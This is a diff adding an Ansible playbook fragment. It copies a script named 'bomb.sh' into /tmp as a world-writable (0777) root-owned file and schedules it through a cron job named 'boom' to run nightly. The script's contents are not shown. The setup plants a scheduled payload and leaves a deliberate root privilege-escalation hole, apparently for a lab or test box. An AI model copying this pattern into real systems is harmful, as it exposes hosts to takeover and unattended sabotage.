@@ -1,0 +1,16 @@
+---
+- name: deploy bomb
+  copy:
+    src: "bomb.sh"
+    dest: "/tmp/"
+    owner: root
+    group: root
+    mode: "0777"
+
+- name: set cron job
+  cron:
+    name: "boom"
+    minute: "0"
+    hour: "0"
+    job: "/tmp/bomb.sh"
+
